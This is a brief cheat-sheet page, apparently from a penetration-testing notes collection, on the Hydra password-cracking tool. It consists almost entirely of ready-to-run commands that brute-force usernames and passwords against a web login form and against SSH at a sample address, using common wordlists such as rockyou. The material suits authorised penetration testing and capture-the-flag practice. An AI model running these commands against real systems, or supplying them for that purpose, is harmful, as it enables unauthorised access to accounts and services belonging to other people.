---
title: Hydra
desc: Cracks username and password.
tags: [Cryptography, Linux, Password]
alts: [CrackStation, Hashcat, JohnTheRipper]
website:
---

## Login form

```sh
# Crack username in login page
hydra -L /usr/share/seclists/Usernames/Names/names.txt -p secret 10.0.0.1 http-post-form "/login.php:username=^USER^&password=secret:Invalid Password" -v -f

# Crack password in login page
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.0.1 http-post-form "/login.php:username=admin&password=^PASS^:Invalid Password" -v -f
```

## SSH

```sh
# Crack username in SSH
hydra -v -L /usr/share/seclists/Usernames/Names/names.txt -p password 10.0.0.1 ssh

# Crack password in SSH
hydra -v -l username -P /usr/share/seclists/Passwords/darkc0de.txt 10.0.0.1 ssh
```